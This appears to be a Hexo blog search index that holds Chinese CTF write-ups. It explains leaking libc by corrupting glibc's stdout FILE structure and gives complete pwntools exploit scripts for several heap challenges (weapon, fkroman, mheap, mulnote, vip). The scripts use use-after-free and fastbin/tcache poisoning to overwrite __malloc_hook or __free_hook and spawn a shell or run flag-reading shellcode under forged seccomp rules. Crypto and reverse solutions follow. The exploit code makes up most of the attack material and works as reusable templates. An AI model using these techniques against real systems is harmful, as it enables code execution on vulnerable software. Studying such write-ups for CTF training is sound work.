<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[IO_FILE泄露libc]]></title>
    <url>%2F2019%2F09%2F21%2FIO_FILE%2F</url>
    <content type="text"><![CDATA[最近经常遇到没有show函数的堆了，吃了不少没有地址的亏，在这里记录一下泄露的方法 其实主要思路就是修改stdout的flag位为0xfbad1800,并且将_IO_write_base的最后一个字节改小，从而实现多输出一些内容，这些内容里面就包含了libc地址。 为什么flag要改成0xfbad1800，看源码： puts函数在源码中是由_IO_puts实现的，而_IO_puts函数内部会调用_IO_sputn，结果会执行_IO_new_file_xsputn，最终会执行_IO_overflow 12345678910111213141516171819202122232425262728int _IO_new_file_overflow (_IO_FILE *f, int ch) &#123; if (f-&gt;_flags &amp; _IO_NO_WRITES) /* SET ERROR */ &#123;//避免进入 f-&gt;_flags |= _IO_ERR_SEEN; __set_errno (EBADF); return EOF; &#125; /* If currently reading or no buffer allocated. */ if ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0 || f-&gt;_IO_write_base == NULL)&#123; ......//避免进入 ...... &#125; if (ch == EOF) return _IO_do_write (f, f-&gt;_IO_write_base, f-&gt;_IO_write_ptr - f-&gt;_IO_write_base); //进入目标 if (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) /* Buffer is really full */ if (_IO_do_flush (f) == EOF) return EOF; *f-&gt;_IO_write_ptr++ = ch; if ((f-&gt;_flags &amp; _IO_UNBUFFERED) || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; ch == '\n')) if (_IO_do_write (f, f-&gt;_IO_write_base, f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) == EOF) return EOF; return (unsigned char) ch; &#125; 可以看到_IO_do_write是最后调用的函数，而_IO_write_base是我们要修改的目标。 这里f-&gt;_flag &amp; _IO_NO_WRITES的值应该为0，为了不进入第一个if分支 同时使f-&gt;_flag &amp;_IO_CURRENTLY_PUTTING的值为1，为了不进入第二个if分支 _IO_do_write函数的参数为：stdout结构体、_IO_write_base和size(由f-&gt;_IO_write_ptr - f-&gt;_IO_write_base决定)，而_IO_do_write实际会调用new_do_write，参数一样。 12345678910111213141516171819202122static_IO_size_tnew_do_write (_IO_FILE *fp, const char *data, _IO_size_t to_do)&#123; ... _IO_size_t count; if (fp-&gt;_flags &amp; _IO_IS_APPENDING) fp-&gt;_offset = _IO_pos_BAD; else if (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base) &#123; _IO_off64_t new_pos = _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, 1); if (new_pos == _IO_pos_BAD) return 0; fp-&gt;_offset = new_pos; &#125; // 调用函数输出输出缓冲区 count = _IO_SYSWRITE (fp, data, to_do); //最终输出 ... return count;&#125; 这里，_IO_SYSWRITE就是我们的目标，这相当于write(fp,data,to_do)。 _IO_SYSSEEK只是简单的调用lseek，但是我们不能完全控制fp-&gt;_IO_write_base - fp-&gt;_IO_read_end的值，如果fp-&gt;_IO_read_end的值设置为0，那么_IO_SYSSEEK的第二个参数值就会过大，如果设置fp-&gt;_IO_write_base = fp-&gt;_IO_read_end的话，那么在其它地方就会有问题，因为fp-&gt;_IO_write_base 不能大于 fp-&gt;_IO_write_end。所以这里要设置fp-&gt;_flags | _IO_IS_APPENDING，避免进入else if 分支。 最终需要构造的fp-flags是这样的，才能绕过上面提到的分支。 1234_flags = 0xfbad0000 _flags &amp;= ~_IO_NO_WRITES ## _flags = 0xfbad0000 _flags |= _IO_CURRENTLY_PUTTING ## _flags = 0xfbad0800_flags |= _IO_IS_APPENDING ## _flags = 0xfbad1800 所以通常将stdout的flags修改成0xfbad1800，将_IO_write_base改小，就可以造成libc的泄漏。 这里以De1CTF的weapon和数字经济云的 fkroman为例 weapon程序保护全开，got不可写 12341. create you weapon2. delete you weapon3. rename your weaponchoice &gt;&gt; 三个功能，没有show函数 1234567891011121314151617unsigned __int64 delete()&#123; signed int v1; // [rsp+4h] [rbp-Ch] unsigned __int64 v2; // [rsp+8h] [rbp-8h] v2 = __readfsqword(0x28u); printf("input idx :"); v1 = sub_AAE(); if ( v1 &lt; 0 &amp;&amp; v1 &gt; 9 ) &#123; printf("error"); exit(0); &#125; free(*((void **)&amp;unk_202060 + 2 * v1)); //UAF puts("Done!"); return __readfsqword(0x28u) ^ v2;&#125; delete中存在UAF漏洞 利用思路： 利用UAF申请到stdout结构体上面，修改flags泄漏libc，将malloc_hook覆盖成onegadget 为了方便调试这里先把asrl关了sudo sh -c &quot;echo 0 &gt; /proc/sys/kernel/randomize_va_space&quot; 接下来说一下我具体的做法，首先申请大小为0x70的chunk0,chunk1,chunk2,将chunk0,chunk1释放掉，此时fastbin:chunk1-&gt;chunk0自用UAF使得fastbin:chunk1-&gt;chunk0内部实现overlap为下一步修改地址做准备，比如我是:0x70: 0x555555757070 —▸ 0x555555757000 ◂— 0x0 –&gt; 0x70: 0x555555757070 —▸ 0x555555757010 ◂— 0x0再将0x555555757010申请为chunk4，现在rename chunk4就可以修改chunk1的大小了。free chunk1，修改chunk1大小为0x90再次free chunk1，这个时候fastbin中的chunk1的fd和bk就会被写入一个main_arena+88 1234567891011pwndbg&gt; bins fastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x555555757070 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x555555757070 /* &apos;ppuUUU&apos; */0x80: 0x0unsortedbinall: 0x555555757070 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x555555757070 /* &apos;ppuUUU&apos; */ 在stdout往上找到一个0x7f的位置充当size，将main_arena+88低2字节覆盖成25dd（5dd是固定的，但是2是随机的，1/16） 申请出来，修改flags和_IO_write_base低字节 1234567891011121314151617181920212223242526272829303132333435pwndbg&gt; p _IO_2_1_stdout_$2 = &#123; file = &#123; _flags = -72542208, //0xfbad1800 _IO_read_ptr = 0x0, _IO_read_end = 0x0, _IO_read_base = 0x0, _IO_write_base = 0x7ffff7dd2600 &lt;_IO_2_1_stderr_+192&gt; 'A' &lt;repeats 32 times&gt;, //低字节修改成了00 _IO_write_ptr = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; "\n", _IO_write_end = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; "\n", _IO_buf_base = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; "\n", _IO_buf_end = 0x7ffff7dd26a4 &lt;_IO_2_1_stdout_+132&gt; "", _IO_save_base = 0x0, _IO_backup_base = 0x0, _IO_save_end = 0x0, _markers = 0x0, _chain = 0x7ffff7dd18e0 &lt;_IO_2_1_stdin_&gt;, _fileno = 1, _flags2 = 0, _old_offset = -1, _cur_column = 0, _vtable_offset = 0 '\000', _shortbuf = "\n", _lock = 0x7ffff7dd3780 &lt;_IO_stdfile_1_lock&gt;, _offset = -1, _codecvt = 0x0, _wide_data = 0x7ffff7dd17a0 &lt;_IO_wide_data_1&gt;, _freeres_list = 0x0, _freeres_buf = 0x0, __pad5 = 0, _mode = -1, _unused2 = '\000' &lt;repeats 19 times&gt; &#125;, vtable = 0x7ffff7dd06e0 &lt;_IO_file_jumps&gt;&#125; 得到libc后，就UAF将onegadget写入malloc_hook 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124#coding:utf-8from pwn import *# context.log_level = 'debug'local = 1if local: p = process('./pwn') elf = ELF('./pwn') libc = elf.libcelse: p = remote("") # elf = ELF('./')#内存地址随机化def debug(addr=0,PIE=True): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16) print "breakpoint_addr --&gt; " + hex(text_base + 0x202060) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr))) sd = lambda s:p.send(s)sl = lambda s:p.sendline(s)rc = lambda s:p.recv(s)ru = lambda s:p.recvuntil(s)def msg(msg,addr): log.warn(msg + "--&gt; " + hex(addr))def create(id,size,data,flag=0): if flag: sl('1') else: ru("choice &gt;&gt; \n") sl('1') ru("weapon: ") sl(str(size)) ru("index: ") sl(str(id)) if flag: ru("name:") else: ru("name:\n") sd(data)def delete(id,flag=0): if flag: sl('2') else: ru("&gt;&gt; \n") sl('2') ru("idx :") sl(str(id))def rename(id,data,flag=0): if flag: sl('3') else: ru("&gt;&gt; \n") sl('3') ru("idx: ") sl(str(id)) if flag: ru("content:") else: ru("content:\n") sd(data)def getshell(): ru("choice &gt;&gt; ") sl('1') ru("weapon: ") sl('32') ru("index: ") sl('0') p.interactive()def pwn(): create(0,0x60,p64(0) + p64(0x71)) create(1,0x60,p64(0) + p64(0x51)) create(2,0x60,p64(0)*3 + p64(0x51)) delete(0) delete(1) rename(1,'\x10') create(3,0x60,'a') # delete(1) create(4,0x60,p64(0)*0xb + p64(0x71)) delete(1) rename(4,p64(0)*0xb + p64(0x91)) delete(1) rename(4,p64(0)*0xb + p64(0x71))#0x35dd rename(1,'\xdd\x25') create(5,0x60,'a') # debug(0xc9b) create(6,0x60,'A'*0x33 + p64(0xfbad1800) + p64(0)*3 + '\x00') # debug() one = [0x45216,0x4526a,0xf02a4,0xf1147] IO_stderr = u64(ru("\x7f")[-6:].ljust(8,'\x00'))-192 libc_base = IO_stderr - libc.symbols['_IO_2_1_stderr_'] onegadget = one[3] + libc_base malloc_hook = libc_base + libc.symbols['__malloc_hook'] fack_chunk = malloc_hook - 0x23 ''' msg("IO_stderr",IO_stderr) msg("libc_base",libc_base) msg("malloc_hook",malloc_hook) msg("fack_chunk",fack_chunk) msg("onegadget",onegadget) ''' create(7,0x60,'a',1) delete(7,1) rename(7,p64(fack_chunk),1) create(7,0x60,'a',1) create(8,0x60,'b'*0x13 + p64(onegadget),1) getshell() # debug()i = 0while 1: i += 1 log.warn(str(i)) try: pwn() except Exception: p.close() p = process('./pwn') continue# pwn() fkroman程序同样保护全开，没有show功能 漏洞：UAF，任意长度堆溢出 利用思路一样，先攻击stdout泄漏libc，再将onegadget写入malloc_hook 只不过这题更简单，堆溢出直接改size不用overlap 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100#coding:utf-8from pwn import *# context.log_level = 'debug'local = 1if local: p = process('./fkroman') elf = ELF('./fkroman') libc = elf.libcelse: p = remote("121.40.246.48","9999") # elf = ELF('./')#内存地址随机化def debug(addr=0,PIE=True): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16) print "breakpoint_addr --&gt; " + hex(text_base + 0x4060) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr))) sd = lambda s:p.send(s)sl = lambda s:p.sendline(s)rc = lambda s:p.recv(s)ru = lambda s:p.recvuntil(s)def alloc(id,size): ru("choice: ") sl('1') ru("Index: ") sl(str(id)) ru("Size: ") sl(str(size))def free(id): ru("choice: ") sl('3') ru("Index: ") sl(str(id))def edit(id,size,data): ru("choice: ") sl('4') ru("Index: ") sl(str(id)) ru("Size: ") sl(str(size)) ru("Content: ") sd(data)def getshell(): ru("choice: ") sl('1') ru("Index: ") sl('0') ru("Size: ") sl('32') p.interactive()def msg(msg,addr): log.warn(msg + "--&gt;" + hex(addr))def pwn(): alloc(0,0x20) alloc(1,0x60) alloc(2,0x60) pay = p64(0)*3 + p64(0x51) edit(2,len(pay),pay) free(1) edit(0,0x30,p64(0)*5 + p64(0x91)) free(1) edit(1,2,'\xdd\x25') edit(0,0x30,p64(0)*5 + p64(0x71)) alloc(0,0x60) alloc(1,0x60) pay = 0x33*'A' + p64(0xfbad1800) + p64(0)*3 + '\x00' edit(1,len(pay),pay) one = [0x45216,0x4526a,0xf02a4,0xf1147] stderr = u64(ru('\x7f')[-6:].ljust(8,'\x00')) - 192 libc_base = stderr - libc.symbols['_IO_2_1_stderr_'] malloc_hook = libc_base + libc.symbols['__malloc_hook'] fack_chunk = malloc_hook - 0x23 onegadget = one[3] + libc_base ''' msg("stderr",stderr) msg("libc_base",libc_base) msg("malloc_hook",malloc_hook) msg("fack_chunk",fack_chunk) msg("onegadget",onegadget) ''' alloc(0,0x60) free(0) edit(0,8,p64(fack_chunk)) alloc(0,0x60) alloc(1,0x60) pay = 0x13*'A' + p64(onegadget) edit(1,len(pay),pay) getshell() # debug()i = 0while 1: i += 1 log.warn(str(i)) try: pwn() except Exception: p.close() p = process('./fkroman')]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[bytectf部分wp]]></title>
    <url>%2F2019%2F09%2F12%2Fbytectf%2F</url>
    <content type="text"><![CDATA[mheap先贴上我觉得最可惜的一道题 程序自已定义了分配原则 12345struct chunk&#123; size_t size; void* next; //only use after free char buf[size];&#125; 并且在程序一开始在0x23330000处申请了0x1000大小的空间当top chunk，以后的每次申请都从这个区域切割 12340x4040d0 --&gt; free列表：free掉的chunk按单链表的形式存放0x4040C0 --&gt; 存放top&apos;s size0x4040C8 --&gt; 存放top chunk0x4040E0 --&gt; chunk列表，最多可存放16个 漏洞点： 123456789101112131415161718192021__int64 __fastcall my_read(__int64 a1, signed int a2)&#123; __int64 result; // rax signed int v3; // [rsp+18h] [rbp-8h] int v4; // [rsp+1Ch] [rbp-4h] v3 = 0; do &#123; result = v3; if ( v3 &gt;= a2 ) break; v4 = read(0, (a1 + v3), a2 - v3); if ( !v4 ) exit(0); v3 += v4; result = *(v3 - 1LL + a1); &#125; while ( result != 10 ); return result;&#125; 最有意思的也是最容易忽略的，当a1+v3超0x23331000时，read返回-1，而!-1 != 1所以可以实现向上读，之后只需要伪造一next指针即可，但是这个伪造块的size在远程似乎很有讲究，最终还是没能找到适合的size exp: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283#coding:utf-8from pwn import *context.log_level = 'debug'local = 1if local: p = process('./mheap') elf = ELF('./mheap') libc = elf.libcelse: p = remote("112.126.98.5","9999") elf = ELF('./mheap') libc = ELF('./libc-2.27.so')sd = lambda s:p.send(s)sl = lambda s:p.sendline(s)rc = lambda s:p.recv(s)ru = lambda s:p.recvuntil(s)def alloc(id,size,data): ru("choice: ") sl("1") ru("Index: ") sl(str(id)) ru("size: ") sl(str(size)) ru("Content: ") sd(data)def show(id): ru("choice: ") sl("2") ru("Index: ") sl(str(id))def free(id): ru("choice: ") sl("3") ru("Index: ") sl(str(id))def edit(id,data): ru("choice: ") sl("4") ru("Index: ") sl(str(id)) sd(data)# chunk = 0x4040E0# 0x4040C0 --&gt; top_chunk's size# 0x4040C8 --&gt; top_chunk# 0x4040d0 --&gt; free 列表alloc(1,0x10,'a'*0x10)free(1)alloc(0,0xfe0-0x20,'\x00'*(0xfe0-0x20))# gdb.attach(p,"b *0x40154E")# gdb.attach(p,"b *0x4011EA")pay = p64(0x4040d0) + 'a'*(0xff0-1)# gdb.attach(p,"b *0x4011EA")size = 0x23330000 alloc(1,0xfff,pay)sl('')# gdb.attach(p,"b *0x40154E")alloc(4,size-0x10,p64(elf.got['puts']) + p64(elf.got['atoi']) + '/bin/sh\x00' + '\n')# gdb.attach(p)show(0)one_local = [0x45216,0x4526a,0xf02a4,0xf1147]one_remote = [0x4f2c5,0x4f322,0x10a38c]puts_addr = u64(rc(6).ljust(8,'\x00'))libc_base = puts_addr - libc.symbols['puts']onegadget = one_local[0] + libc_basesystem = libc_base + libc.symbols['system']binsh_addr = libc_base + libc.search("/bin/sh").next()log.info("puts_addrts --&gt; %s",hex(puts_addr))log.info("libc_base --&gt; %s",hex(libc_base))log.info("system --&gt; %s",hex(system))log.info("binsh_addr --&gt; %s",hex(binsh_addr))log.info("onegadget --&gt; %s",hex(onegadget))# gdb.attach(p)edit(1,p64(system) + '\n')ru("choice: ")sl('/bin/sh')# gdb.attach(p)p.interactive() mulnote程序丑到爆炸，但是就是一个简单的UAF exp: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980#coding:utf-8from pwn import *context.log_level = 'debug'local = 0if local: p = process('./mulnote') elf = ELF('./mulnote') libc = elf.libcelse: p = remote("112.126.101.96","9999") elf = ELF('./mulnote') libc = ELF('./libc.so')#内存地址随机化def debug(addr=0,PIE=True): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16) print "breakpoint_addr --&gt; " + hex(text_base + 0x202040) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr))) sd = lambda s:p.send(s)sl = lambda s:p.sendline(s)rc = lambda s:p.recv(s)ru = lambda s:p.recvuntil(s)def create(size,note): ru("&gt;") sl("C") ru("size&gt;") sl(str(size)) ru("note&gt;") sl(note)def edit(id,note): ru("&gt;") sl("E") ru("index&gt;") sl(str(id)) ru("note&gt;") sl(note)def Remove(id): ru("&gt;") sl("R") ru("index&gt;") sl(str(id))def show(): ru("&gt;") sl("S")create(0x80,'b')#0create(0x18,'a'*0x18)#1Remove(0)show()ru("[0]:\n")one_local = [0x45216,0x4526a,0xf02a4,0xf1147]main_arena = u64(rc(6).ljust(8,'\x00')) - 88malloc_hook = main_arena - 0x10libc_base = malloc_hook - libc.symbols['__malloc_hook']onegadget = libc_base + one_local[1]fack_chunk = malloc_hook - 0x23log.info("main_arena --&gt; %s",hex(main_arena))log.info("malloc_hook --&gt; %s",hex(malloc_hook))log.info("libc_base --&gt; %s",hex(malloc_hook))log.info("onegadget --&gt; %s",hex(onegadget))log.info("fack_chunk --&gt; %s",hex(fack_chunk))create(0x68,'a')#2create(0x68,'b')#3Remove(2)Remove(3)Remove(2)pay = p64(fack_chunk)create(0x68,pay)create(0x68,'a')create(0x68,'b')pay = 0x13*'a' + p64(onegadget)create(0x68,pay)ru("&gt;")sl("C")ru("size&gt;")sl('32')# debug()p.interactive() vip分析程序可以看到，在edit函数中有个任意长度的堆溢出 1234567891011ssize_t __fastcall sub_4014A8(void *a1, int a2)&#123; int fd; // [rsp+1Ch] [rbp-4h] if ( dword_4040E0 ) return read(0, a1, a2); fd = open("/dev/urandom", 0); if ( fd == -1 ) exit(0); return read(fd, a1, a2);&#125; 但是前提是dword_4040E0不为0，否则溢出的也只是不可控的随机数 程序的run函数中调用了prtcl函数，而它的第7个参数刚好能被覆盖到0x30字节，所以可以伪造6条沙盒规则，这里我们把open函数关闭（return ERROR(0)），顺便打开mprotect绕过NX，那么前面提到的open(&quot;/dev/urandom&quot;)就会返回0，使得read(fd,a1,a2) == read(0,a1,a2)，接下来就tcache了,但是因为execve函数被禁用了，所以这里用写shellcode直接读flag。 exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144from pwn import *context(arch = 'amd64' , os = 'linux')context.terminal = ['tmux', 'splitw', '-h']context.log_level = "debug"p = process("./vip")#p = remote("112.126.103.14", 9999)ru = lambda x : p.recvuntil(x)sn = lambda x : p.send(x)rl = lambda : p.recvline()sl = lambda x : p.sendline(x)rv = lambda x : p.recv(x)sa = lambda a,b : p.sendafter(a,b) sla = lambda a,b : p.sendlineafter(a, b)slog = lambda x : log.success(x)flog = lambda x : log.success(x)libc = ELF("./libc-2.27.so")def choose(idx): sla(": ", str(idx))def alloc(idx): choose(1) sla(": ", str(idx))def show(idx): choose(2) sla(": ", str(idx))def free(idx): choose(3) sla(": ", str(idx))def edit(idx, size, ctx): choose(4) sla(": ", str(idx)) sla(": ", str(size)) sa(": ", ctx)def rule(code,jt ,jf ,k): return p16(code) + p8(jt) + p8(jf) + p32(k) #def build_rule():# payload = ''# payload+= rule(0x20 ,0x00, 0x00, 0x00000004) # A = arch# payload+= rule(0x15 ,0x00, 0x03, 0xc000003e) # if (A != ARCH_X86_64) goto 0010# payload+= rule(0x20 ,0x00, 0x00, 0x00000000) # A = sys_number# payload+= rule(0x15 ,0x01, 0x00, 0x00000002) # if (A == open) goto 0006# payload+= rule(0x06 ,0x00, 0x00, 0x7fff0000) # return ALLOW# # payload+= rule(0x15 ,0x03, 0x00, 0x0000003b) # if (A == execve) goto 0005# payload+= rule(0x06 ,0x00, 0x00, 0x00050000) # return ERRNO(2)# return payloaddef build_rule(): payload = '' payload+= rule(0x20 ,0x00, 0x00, 0x00000000) # A = arch payload+= rule(0x15 ,0x07, 0x00, 0x00000001) # if (A == write) goto 0009 payload+= rule(0x15 ,0x06, 0x00, 0x00000000) # if (A == read) goto 0009 payload+= rule(0x15 ,0x05, 0x00, 0x0000000a) # if (A == mprotect) goto 0009 payload+= rule(0x15 ,0x04, 0x00, 0x40000002) # if (A == open) goto 0009 payload+= rule(0x06 ,0x00, 0x00, 0x00050000) # return ERRNO(2) return payloadfor i in range(15): alloc(i)pay = "a"*0x20+build_size()print hex(len(pay))pause()choose(6)sa("name: \n", pay)p.interactive()edit(0, 0x70, "a"*0x50+p64(0)+p64(0x421))#gdb.attach(p)free(1)alloc(0)show(0)leak = ru("\x7f").ljust(8, "\x00")leak = u64(leak)libc.address = leak-0x3ec090log.info("libc.address --&gt; %s",hex(libc.address))alloc(0)alloc(1)free(6)free(7)free(8)free(9)free(0)edit(2, 16, p64(libc.symbols['__free_hook']))alloc(4)alloc(3)free(2)edit(4, 20, p64(0x404140))alloc(0)alloc(0)edit(3, 0x20, p64(libc.symbols['setcontext']+53))frame = SigreturnFrame()frame.rsp = 0x404150frame.rip = libc.symbols["mprotect"]frame.rdx = 0x7frame.rsi = 0x1000frame.rdi = 0x404000payload = "./flag\x00\x00"payload += p64(0)payload += p64(0x404260) + p64(1) + p64(1)*32code = ''' mov rdi, 0x404140; mov rsi, 0; mov rdx, 0; mov eax, 0x40000002; syscall; mov rdi, 3; mov rsi, 0x404160; mov rdx, 100; mov eax, 0; syscall; mov rdi, 1; mov rsi, 0x404160; mov rdx, 100; mov eax, 1; syscall;'''payload += asm(code)edit(0, 0x1000, payload)edit(4, 0x300, str(frame))free(4)p.interactive() MISCbetgame第一关：b –&gt; s ; j –&gt; b ; s – j ; 第二关：j –&gt; s ; s –&gt; b ; b –&gt; j; 第三关：s –&gt; s ; b –&gt; b ; j –&gt; j; 写个脚本跑一通就行了 1234567891011121314151617181920212223from pwn import *context.log_level ='debug'p = remote("112.125.25.81","9999")for i in range(30): p.recvuntil("use: ") s = p.recv(1) if i%3 == 0: p.sendline(s) elif i%3 == 1: if s == 'j': p.sendline("b") elif s == 's': p.sendline("j") else : p.sendline("s") else : if s == 'j': p.sendline("s") elif s == 's': p.sendline("b") else : p.sendline("j")p.interactive() jigsaw拼图出flag2333 CRYPTOlrlraes随机数漏洞加广播攻击 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778import gmpy2import libnumfrom Crypto.Util.number import long_to_bytes, bytes_to_long, getPrimefrom Crypto.Cipher import AESfrom randcrack import RandCrackimport randomdef GCRT(mi, ai): assert( isinstance (mi, list) and isinstance(ai, list)) curm, cura = mi[0], ai[0] for (m, a ) in zip(mi[1:],ai[1:]): d = gmpy2.gcd(curm, m) c = a - cura k = c // d *libnum.invmod(curm // d, m // d) cura += curm * k curm = curm * m // d cura %= curm return (cura %curm, curm)rc = RandCrack()r = []fd = open("old","r")out = fd.readline()while out: r.append(int(out.strip('\n'),10)) out = fd.readline()# print rfor i in r[-624:]: rc.submit(i)for i in range(24): rc.predict_getrandbits(128)p = []for i in range(48): predict = rc.predict_getrandbits(128) p.append(predict)# print pfd = open("new","r")out = fd.readline()cn = []while out: cn.append(long_to_bytes(int(out.strip('\n'),16)))# print out out = fd.readline()# print cnmn = []clist = []for i in range(24): key = long_to_bytes(p[24+i]) h = AES.new(key, AES.MODE_CBC, b"\x00"*16) cnow = h.decrypt(cn[i]) key = long_to_bytes(p[i]) h = AES.new(key, AES.MODE_CBC, b"\x00"*16) mnow = h.decrypt(cnow) mn.append(mnow)clist = list(map(bytes_to_long, mn))# print clistnlist = []fd = open("cl","r")out = fd.readline()while out: nlist.append(int(out.strip('\n')[2:-1],16)) out = fd.readline()# print nlistm = GCRT(nlist, clist)[0]# print me = 17if gmpy2.iroot(m, e)[1] == 1: flag = gmpy2.iroot(m, e)[0] print flag# 61406796444626535559771097418338494728649815464609781204026855332620301752444 然后z3解方程 123456789101112131415161718192021from z3 import *seed = BitVec("f", 256+1)c = 0x10000000000000000000000000000000000000000000000000000000000000223m = 61406796444626535559771097418338494728649815464609781204026855332620301752444def calc(f): p = 0 for i in range(256-1, -1, -1): p = p * 2 p = If(Extract(i, i, f)==1, p^f, p) p = If(LShR(p, 256)==1, p^c, p) return psolver = Solver()solver.add(m==calc(seed))solver.add(Extract(256, 256, seed)==0)for i in range(7, 257, 8): solver.add(Extract(i, i, seed)==0)print(solver)if solver.check() == sat: print(solver.model())flag&#123;very_simple_random_problem&#125; REVERSE驱动逆向分析下来可以发现是AES加密 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485char *__fastcall sub_140002DD0(char *a1)&#123; char *result; // rax char v2; // [rsp+20h] [rbp-158h] char v3; // [rsp+21h] [rbp-157h] char v4[64]; // [rsp+E0h] [rbp-98h] char iv; // [rsp+120h] [rbp-58h] char md5_key; // [rsp+130h] [rbp-48h] char *v7; // [rsp+180h] [rbp+8h] v7 = a1; v2 = 0; memset(&amp;v3, 0, 0xBFui64); v4[0] = 0x89u; v4[1] = 0xB7u; v4[2] = 0xEEu; v4[3] = 0xD5u; v4[4] = 0x7E; v4[5] = 0xDFu; v4[6] = 0xBEu; v4[7] = 0x67; v4[8] = 0xBBu; v4[9] = 0xEDu; v4[10] = 0xC3u; v4[11] = 0x6D; v4[12] = 0x51; v4[13] = 0x74; v4[14] = 0xAEu; v4[15] = 0x53; v4[16] = 3; v4[17] = 0xA4u; v4[18] = 0x60; v4[19] = 0xD3u; v4[20] = 0xE7u; v4[21] = 0xF5u; v4[22] = 0xA1u; v4[23] = 0xDEu; v4[24] = 7; v4[25] = 0x6B; v4[26] = 0x25; v4[27] = 0xD7u; v4[28] = 0x57; v4[29] = 0xCEu; v4[30] = 0xC2u; v4[31] = 0x6F; v4[32] = 0xD3u; v4[33] = 0xA5u; v4[34] = 0xFFu; v4[35] = 0xD7u; v4[36] = 0x8Cu; v4[37] = 0x54; v4[38] = 0x16; v4[39] = 0x9Fu; v4[40] = 0xE3u; v4[41] = 0xBFu; v4[42] = 2; v4[43] = 0x14; v4[44] = 0x9Eu; v4[45] = 7; v4[46] = 0xBEu; v4[47] = 0xB2u; v4[48] = 0x6D; v4[49] = 0x28; v4[50] = 0x65; v4[51] = 0x94u; v4[52] = 0x19; v4[53] = 0xE1u; v4[54] = 0x51; v4[55] = 0xDFu; v4[56] = 0x7E; v4[57] = 0x76; v4[58] = 0xA3u; v4[59] = 0xC3u; v4[60] = 0xB2u; v4[61] = 0x3B; v4[62] = 0xA6u; v4[63] = 0x69; qmemcpy(&amp;md5_key, &amp;::md5_key, 0x20ui64); qmemcpy(&amp;iv, ::iv, 0x10ui64); sub_1400010D0(&amp;v2, &amp;md5_key, &amp;iv); sub_140001000(&amp;v2, v4, 0x40u); result = v4; qmemcpy(v7, v4, 0x40ui64); return result;&#125; 这里v4是密文 ，md5key是通过伪造的“Fakelntel”分4段进行计算的结果 ：key = b”\x52\xa9\x65\x08\xc3\x95\x36\xf0\xc2\x42\x53\x9b\x77\x17\xfb\xc6” IV由题目给出：25 40 5a 86 b5 f1 3e 58 80 9b db 0b 30 49 66 8c 123456789101112from Crypto.Hash import MD5from Crypto.cipher import AESimport binasciiiv = b"\x25\x40\x5a\x86\xb5\xf1\x3e\x58\x80\x9b\xdb\x0b\x30\x49\x66\x8c"key = b"\x52\xa9\x65\x08\xc3\x95\x36\xf0\xc2\x42\x53\x9b\x77\x17\xfb\xc6"M = [137, 183, 238, 213, 126, 223, 190, 103, 187, 237, 195, 109, 81, 116, 174, 83, 3, 164, 96, 211, 231, 245, 161, 222, 7, 107, 37, 215, 87, 206, 194, 111, 211, 165, 255, 215, 140, 84, 22, 159, 227, 191, 2, 20, 158, 7, 190, 178, 109, 40, 101, 148, 25, 225, 81, 223, 126, 118, 163, 195, 178, 59, 166, 105]M = bytes(M)handle = AES.new(key=key, mode=AES.MODE_CBC, IV=iv)m = handle.decrypt(M)print(m)# "bytectf&#123;d0f20eff6fc4f6060776c8ca63319a1e&#125;"]]></content>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[第五**空间pwn部分wp]]></title>
    <url>%2F2019%2F08%2F29%2F%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%2F</url>
